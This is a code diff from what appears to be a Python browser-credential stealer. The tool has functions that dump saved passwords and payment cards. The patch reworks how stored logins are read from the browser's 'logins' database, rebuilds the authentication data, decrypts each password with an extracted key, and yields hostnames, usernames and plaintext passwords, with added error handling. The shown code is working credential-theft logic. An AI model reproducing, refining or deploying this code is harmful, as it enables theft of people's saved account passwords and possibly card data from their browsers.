@@ -74,22 +74,29 @@ def dump_passwords(profile : str) -> list[dict]:
             print('[!] Failed to extract enc key')
             return None
         # Execute queries
-        cursor.execute('SELECT origin_url, username_value, password_value, signon_realm FROM logins')
-        for url, username, password, signon_realm in cursor.fetchall():
+        cursor.execute('SELECT origin_url, username_element, username_value, password_element, password_value, signon_realm FROM logins')
+        for url, username_element, username, password_element, password, signon_realm in cursor.fetchall():
+            # Серёга костыль
+            if type(url) == bytes:
+                url = url.decode()
             # Get AAD
-            str_to_hash = url + '\0' + '\0' + username + '\0' + '\0' + signon_realm
+            str_to_hash = f'{url}\0{username_element}\0{username}\0{password_element}\0{signon_realm}'
             hash_obj = SHA1.new()
             hash_obj.update(str_to_hash.encode('utf-8'))
             # Decrypt password value
             if len(password) > 0:
-                decrypted = decrypt(
-                    key=enc_key,
-                    encrypted_data=password[12:-16],
-                    nonce=password[:12],
-                    tag=password[-16:],
-                    aad=hash_obj.digest()
-                )
-                yield dict(hostname=url, username=username, password=decrypted)
+                try:
+                    decrypted = decrypt(
+                        key=enc_key,
+                        encrypted_data=password[12:-16],
+                        nonce=password[:12],
+                        tag=password[-16:],
+                        aad=hash_obj.digest()
+                    )
+                except Exception as e: 
+                    print(e)
+                else:
+                    yield dict(hostname=url, username=username, password=decrypted)
 
 
 def dump_cards(profile : str) -> list[dict]:
